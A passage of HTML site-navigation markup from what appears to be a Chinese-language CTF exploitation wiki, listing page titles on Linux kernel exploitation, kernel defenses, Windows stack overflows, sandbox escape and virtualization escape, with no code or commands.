Defense </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../mitigation/canary/ class=md-nav__link> Canary </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-4 type=checkbox id=nav-9-1-1-4> <label class=md-nav__link for=nav-9-1-1-4> Summary <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Summary data-md-level=4> <label class=md-nav__title for=nav-9-1-1-4> <span class="md-nav__icon md-icon"></span> Summary </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../summary/get-address/ class=md-nav__link> 獲取地址 </a> </li> <li class=md-nav__item> <a href=../../../../summary/hijack-control-flow/ class=md-nav__link> 控制程序執行流 </a> </li> <li class=md-nav__item> <a href=../../../../summary/get-shell/ class=md-nav__link> shell 獲取小結 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2 type=checkbox id=nav-9-1-2> <label class=md-nav__link for=nav-9-1-2> Kernel Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Kernel Mode" data-md-level=3> <label class=md-nav__title for=nav-9-1-2> <span class="md-nav__icon md-icon"></span> Kernel Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-1 type=checkbox id=nav-9-1-2-1> <label class=md-nav__link for=nav-9-1-2-1> Basic Knowledge <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basic Knowledge" data-md-level=4> <label class=md-nav__title for=nav-9-1-2-1> <span class="md-nav__icon md-icon"></span> Basic Knowledge </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/basic-knowledge/ class=md-nav__link> 基礎知識 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-2 type=checkbox id=nav-9-1-2-2> <label class=md-nav__link for=nav-9-1-2-2> Environment <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Environment data-md-level=4> <label class=md-nav__title for=nav-9-1-2-2> <span class="md-nav__icon md-icon"></span> Environment </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/environment/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/environment/build-kernel/ class=md-nav__link> 內核下載與編譯 </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/environment/build-kernel-module/ class=md-nav__link> 編譯內核驅動 </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/environment/qemu-emulate/ class=md-nav__link> Qemu 模擬環境 </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/environment/real-device/ class=md-nav__link> Real Device </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/environment/System.map/ class=md-nav__link> System.map </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-3 type=checkbox id=nav-9-1-2-3> <label class=md-nav__link for=nav-9-1-2-3> Aim <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Aim data-md-level=4> <label class=md-nav__title for=nav-9-1-2-3> <span class="md-nav__icon md-icon"></span> Aim </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/aim/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-3-2 type=checkbox id=nav-9-1-2-3-2> <label class=md-nav__link for=nav-9-1-2-3-2> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-3-2> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/aim/privilege-escalation/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/aim/privilege-escalation/change-self/ class=md-nav__link> Change Self </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/aim/privilege-escalation/change-others/ class=md-nav__link> Change Others </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/aim/info-leak/ class=md-nav__link> Information Disclosure </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/aim/dos/ class=md-nav__link> DoS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4 type=checkbox id=nav-9-1-2-4> <label class=md-nav__link for=nav-9-1-2-4> Defense <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Defense data-md-level=4> <label class=md-nav__title for=nav-9-1-2-4> <span class="md-nav__icon md-icon"></span> Defense </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2 type=checkbox id=nav-9-1-2-4-2> <label class=md-nav__link for=nav-9-1-2-4-2> Isolation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Isolation data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-2> <span class="md-nav__icon md-icon"></span> Isolation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/isolation/readme/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2-2 type=checkbox id=nav-9-1-2-4-2-2> <label class=md-nav__link for=nav-9-1-2-4-2-2> User and Kernel <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User and Kernel" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-4-2-2> <span class="md-nav__icon md-icon"></span> User and Kernel </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/isolation/user-kernel/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/isolation/user-kernel/user-code-execution/ class=md-nav__link> 用戶代碼不可執行 </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/isolation/user-kernel/user-data-access/ class=md-nav__link> 用戶數據不可訪問 </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/isolation/user-kernel/kpti/ class=md-nav__link> KPTI - Kernel Page Table Isolation </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-2-3 type=checkbox id=nav-9-1-2-4-2-3> <label class=md-nav__link for=nav-9-1-2-4-2-3> Inside Kernel <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Inside Kernel" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-4-2-3> <span class="md-nav__icon md-icon"></span> Inside Kernel </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/isolation/inner-kernel/heap-chunk/ class=md-nav__link> 內部隔離 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-3 type=checkbox id=nav-9-1-2-4-3> <label class=md-nav__link for=nav-9-1-2-4-3> Access Control <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Access Control" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-3> <span class="md-nav__icon md-icon"></span> Access Control </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/access-control/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/access-control/information-disclosure/ class=md-nav__link> 信息泄漏 </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/access-control/misc/ class=md-nav__link> Misc </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-4 type=checkbox id=nav-9-1-2-4-4> <label class=md-nav__link for=nav-9-1-2-4-4> Detection <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Detection data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-4> <span class="md-nav__icon md-icon"></span> Detection </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/detection/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/detection/canary/ class=md-nav__link> Kernel Stack Canary </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-4-5 type=checkbox id=nav-9-1-2-4-5> <label class=md-nav__link for=nav-9-1-2-4-5> Randomization <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Randomization data-md-level=5> <label class=md-nav__title for=nav-9-1-2-4-5> <span class="md-nav__icon md-icon"></span> Randomization </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/randomization/readme/ class=md-nav__link> Introduction </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/randomization/kaslr/ class=md-nav__link> KASLR </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/defense/randomization/fgkaslr/ class=md-nav__link> FGKASLR </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5 type=checkbox id=nav-9-1-2-5> <label class=md-nav__link for=nav-9-1-2-5> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-1-2-5> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/introduction/ class=md-nav__link> 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-2 type=checkbox id=nav-9-1-2-5-2> <label class=md-nav__link for=nav-9-1-2-5-2> Returned Oriented Programming <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Returned Oriented Programming" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-2> <span class="md-nav__icon md-icon"></span> Returned Oriented Programming </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/rop/rop/ class=md-nav__link> Kernel ROP </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/rop/kpti-bypass/ class=md-nav__link> Kernel ROP with KPTI bypass </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/rop/ret2usr/ class=md-nav__link> ret2usr（已過時） </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/rop/bypass-smep/ class=md-nav__link> bypass-smep </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/rop/ret2ptregs/ class=md-nav__link> 利用 pt_regs 構造通用內核 ROP </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/rop/ret2dir/ class=md-nav__link> ret2dir </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-3 type=checkbox id=nav-9-1-2-5-3> <label class=md-nav__link for=nav-9-1-2-5-3> Heap Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Heap Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-3> <span class="md-nav__icon md-icon"></span> Heap Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/heap/heap_overview/ class=md-nav__link> 內核堆概述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-3-2 type=checkbox id=nav-9-1-2-5-3-2> <label class=md-nav__link for=nav-9-1-2-5-3-2> slub allocator <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="slub allocator" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-5-3-2> <span class="md-nav__icon md-icon"></span> slub allocator </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/heap/slub/uaf/ class=md-nav__link> kernel UAF </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/heap/slub/spray/ class=md-nav__link> Heap Spray </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/heap/slub/freelist/ class=md-nav__link> freelist 劫持 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-3-3 type=checkbox id=nav-9-1-2-5-3-3> <label class=md-nav__link for=nav-9-1-2-5-3-3> Buddy System <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Buddy System" data-md-level=6> <label class=md-nav__title for=nav-9-1-2-5-3-3> <span class="md-nav__icon md-icon"></span> Buddy System </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/heap/buddy/cross-cache/ class=md-nav__link> Cross-Cache Overflow &amp; Page-level Heap Fengshui </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/heap/buddy/page-uaf/ class=md-nav__link> Page-level UAF </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-4 type=checkbox id=nav-9-1-2-5-4> <label class=md-nav__link for=nav-9-1-2-5-4> Race Condition <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Race Condition" data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-4> <span class="md-nav__icon md-icon"></span> Race Condition </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/race/double-fetch/ class=md-nav__link> Double Fetch </a> </li> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/race/userfaultfd/ class=md-nav__link> userfaultfd 的使用 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-2-5-5 type=checkbox id=nav-9-1-2-5-5> <label class=md-nav__link for=nav-9-1-2-5-5> Tricks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tricks data-md-level=5> <label class=md-nav__title for=nav-9-1-2-5-5> <span class="md-nav__icon md-icon"></span> Tricks </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../kernel-mode/exploitation/tricks/initramfs/ class=md-nav__link> 在內存中直接搜索 flag </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2 type=checkbox id=nav-9-2> <label class=md-nav__link for=nav-9-2> Windows Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Platform" data-md-level=2> <label class=md-nav__title for=nav-9-2> <span class="md-nav__icon md-icon"></span> Windows Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../windows/readme/ class=md-nav__link> 概述 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2 type=checkbox id=nav-9-2-2> <label class=md-nav__link for=nav-9-2-2> User Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User Mode" data-md-level=3> <label class=md-nav__title for=nav-9-2-2> <span class="md-nav__icon md-icon"></span> User Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../windows/user-mode/readme/ class=md-nav__link> Readme </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2-2 type=checkbox id=nav-9-2-2-2> <label class=md-nav__link for=nav-9-2-2-2> 棧溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=棧溢出 data-md-level=4> <label class=md-nav__title for=nav-9-2-2-2> <span class="md-nav__icon md-icon"></span> 棧溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../windows/user-mode/stackoverflow/stack-introduction/ class=md-nav__link> 棧介紹 </a> </li> <li class=md-nav__item> <a href=../../../../../../windows/user-mode/stackoverflow/stackoverflow-basic/ class=md-nav__link> 棧溢出原理 </a> </li> <li class=md-nav__item> <a href=../../../../../../windows/user-mode/stackoverflow/shellcode-in-stack/ class=md-nav__link> 執行 Shellcode </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-2-3 type=checkbox id=nav-9-2-2-3> <label class=md-nav__link for=nav-9-2-2-3> 栈溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=栈溢出 data-md-level=4> <label class=md-nav__title for=nav-9-2-2-3> <span class="md-nav__icon md-icon"></span> 栈溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../windows/user-mode/stackoverflow/ret2dll/ class=md-nav__link> ret2dll利用 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-3 type=checkbox id=nav-9-2-3> <label class=md-nav__link for=nav-9-2-3> Kernel Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Kernel Mode" data-md-level=3> <label class=md-nav__title for=nav-9-2-3> <span class="md-nav__icon md-icon"></span> Kernel Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-2-3-1 type=checkbox id=nav-9-2-3-1> <label class=md-nav__link for=nav-9-2-3-1> Basic Knowledge <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basic Knowledge" data-md-level=4> <label class=md-nav__title for=nav-9-2-3-1> <span class="md-nav__icon md-icon"></span> Basic Knowledge </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../windows/kernel-mode/basic-knowledge/introduction/ class=md-nav__link> 基礎知識 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-3 type=checkbox id=nav-9-3> <label class=md-nav__link for=nav-9-3> MacOS Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="MacOS Platform" data-md-level=2> <label class=md-nav__title for=nav-9-3> <span class="md-nav__icon md-icon"></span> MacOS Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../macos/readme/ class=md-nav__link> MacOS </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-4 type=checkbox id=nav-9-4> <label class=md-nav__link for=nav-9-4> Misc OS Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Misc OS Platform" data-md-level=2> <label class=md-nav__title for=nav-9-4> <span class="md-nav__icon md-icon"></span> Misc OS Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../misc-os/readme/ class=md-nav__link> Readme </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5 type=checkbox id=nav-9-5> <label class=md-nav__link for=nav-9-5> Sandbox Escape <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Sandbox Escape" data-md-level=2> <label class=md-nav__title for=nav-9-5> <span class="md-nav__icon md-icon"></span> Sandbox Escape </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-1 type=checkbox id=nav-9-5-1> <label class=md-nav__link for=nav-9-5-1> python <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=python data-md-level=3> <label class=md-nav__title for=nav-9-5-1> <span class="md-nav__icon md-icon"></span> python </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/python/python-sandbox-escape/ class=md-nav__link> Python 沙盒 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-2 type=checkbox id=nav-9-5-2> <label class=md-nav__link for=nav-9-5-2> shell <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=shell data-md-level=3> <label class=md-nav__title for=nav-9-5-2> <span class="md-nav__icon md-icon"></span> shell </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/shell/readme/ class=md-nav__link> Shell Sandbox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-3 type=checkbox id=nav-9-5-3> <label class=md-nav__link for=nav-9-5-3> seccomp <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=seccomp data-md-level=3> <label class=md-nav__title for=nav-9-5-3> <span class="md-nav__icon md-icon"></span> seccomp </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/seccomp/c-sandbox-escape/ class=md-nav__link> C 沙盒逃逸 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-4 type=checkbox id=nav-9-5-4> <label class=md-nav__link for=nav-9-5-4> namespace <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=namespace data-md-level=3> <label class=md-nav__title for=nav-9-5-4> <span class="md-nav__icon md-icon"></span> namespace </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/namespace/readme/ class=md-nav__link> Namespace </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-5 type=checkbox id=nav-9-5-5> <label class=md-nav__link for=nav-9-5-5> chroot <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=chroot data-md-level=3> <label class=md-nav__title for=nav-9-5-5> <span class="md-nav__icon md-icon"></span> chroot </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/chroot/readme/ class=md-nav__link> Chroot </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-5-6 type=checkbox id=nav-9-5-6> <label class=md-nav__link for=nav-9-5-6> docker <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=docker data-md-level=3> <label class=md-nav__title for=nav-9-5-6> <span class="md-nav__icon md-icon"></span> docker </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../sandbox/docker/readme/ class=md-nav__link> Docker </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6 type=checkbox id=nav-9-6> <label class=md-nav__link for=nav-9-6> Virtualization <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Virtualization data-md-level=2> <label class=md-nav__title for=nav-9-6> <span class="md-nav__icon md-icon"></span> Virtualization </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-1 type=checkbox id=nav-9-6-1> <label class=md-nav__link for=nav-9-6-1> 基礎知識 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基礎知識 data-md-level=3> <label class=md-nav__title for=nav-9-6-1> <span class="md-nav__icon md-icon"></span> 基礎知識 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/basic-knowledge/basic-knowledge/ class=md-nav__link> 虛擬化技術簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../virtualization/basic-knowledge/cpu-virtualization/ class=md-nav__link> CPU 虛擬化 </a> </li> <li class=md-nav__item> <a href=../../../../../../virtualization/basic-knowledge/mem-virtualization/ class=md-nav__link> 內存虛擬化 </a> </li> <li class=md-nav__item> <a href=../../../../../../virtualization/basic-knowledge/io-virtualization/ class=md-nav__link> IO 虛擬化 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2 type=checkbox id=nav-9-6-2> <label class=md-nav__link for=nav-9-6-2> QEMU <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=QEMU data-md-level=3> <label class=md-nav__title for=nav-9-6-2> <span class="md-nav__icon md-icon"></span> QEMU </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-1 type=checkbox id=nav-9-6-2-1> <label class=md-nav__link for=nav-9-6-2-1> 基礎知識 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基礎知識 data-md-level=4> <label class=md-nav__title for=nav-9-6-2-1> <span class="md-nav__icon md-icon"></span> 基礎知識 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/qemu/basic-knowledge/mm/ class=md-nav__link> QEMU 內存管理 </a> </li> <li class=md-nav__item> <a href=../../../../../../virtualization/qemu/basic-knowledge/dev/ class=md-nav__link> QEMU 設備模擬 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-2 type=checkbox id=nav-9-6-2-2> <label class=md-nav__link for=nav-9-6-2-2> 環境搭建 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=環境搭建 data-md-level=4> <label class=md-nav__title for=nav-9-6-2-2> <span class="md-nav__icon md-icon"></span> 環境搭建 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/qemu/environment/build-qemu/ class=md-nav__link> QEMU 下載與編譯 </a> </li> <li class=md-nav__item> <a href=../../../../../../virtualization/qemu/environment/build-qemu-dev/ class=md-nav__link> 編寫 QEMU 模擬設備 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-2-3 type=checkbox id=nav-9-6-2-3> <label class=md-nav__link for=nav-9-6-2-3> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-6-2-3> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/qemu/exploitation/intro/ class=md-nav__link> QEMU 逃逸入門 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-3 type=checkbox id=nav-9-6-3> <label class=md-nav__link for=nav-9-6-3> Virtual Box <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Virtual Box" data-md-level=3> <label class=md-nav__title for=nav-9-6-3> <span class="md-nav__icon md-icon"></span> Virtual Box </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/virtualbox/readme/ class=md-nav__link> VirtualBox </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-4 type=checkbox id=nav-9-6-4> <label class=md-nav__link for=nav-9-6-4> VMWare <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=VMWare data-md-level=3> <label class=md-nav__title for=nav-9-6-4> <span class="md-nav__icon md-icon"></span> VMWare </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../virtualization/vmware/readme/ class=md-nav__link> VMWare </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-6-5 type=checkbox id=nav-9-6-5> <label class=md-nav__link for=nav-9-6-5> Parallels <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Parallels data-md-level=3> <label class=md-nav__title for=nav-9-6-5> <span class="md-nav__icon md-icon"></span> Parallels </label> <ul class=md-nav__list data-md-scrollfix> <li 